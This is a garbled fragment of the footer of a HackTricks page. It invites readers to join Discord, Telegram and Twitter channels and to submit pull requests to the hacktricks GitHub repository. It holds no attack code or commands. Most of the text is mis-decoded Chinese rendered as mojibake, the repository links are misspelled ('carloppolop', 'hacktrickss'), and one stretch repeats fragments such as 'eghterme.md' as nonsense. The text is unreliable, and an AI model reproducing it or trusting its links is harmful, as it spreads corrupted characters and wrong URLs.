 -  **åŠ å…¥** [**ğŸ’¬**]ï¼ˆhttps://emojipedia.org/speech-balloon/ï¼‰[** discord group **]ï¼ˆhttps://discord.gg/hrep4ruj7fï¼‰æˆ–[ **ç”µæŠ¥ç»„**]ï¼ˆhttps://t.me/peassï¼‰æˆ–**åœ¨** Twitter ** [**ğŸ¦**]ï¼ˆhttps://github.com/carloppolop/hacktrickss on ** twitter **ï¼‰ /ree/7af18b62b3bdc423e114444444677a6a73d4043511e9/ \ [https:/emojipedia.org/bird/bird/readme.mdï¼‰eardme.mdï¼‰eghterme.mdï¼‰eghterme.mdï¼‰eghterme.mdï¼‰eghtemplopmbyth

- **Share your hacking tricks by submitting PRs to the** [**hacktricks github repo**](https://github.com/carlospolop/hacktricks)**.**

 -  **é€šè¿‡å°†PRSæäº¤ç»™** [** hacktricks github repo **]ï¼ˆhttps://github.com/carloppolop/hacktricksï¼‰**ã€‚

</details>


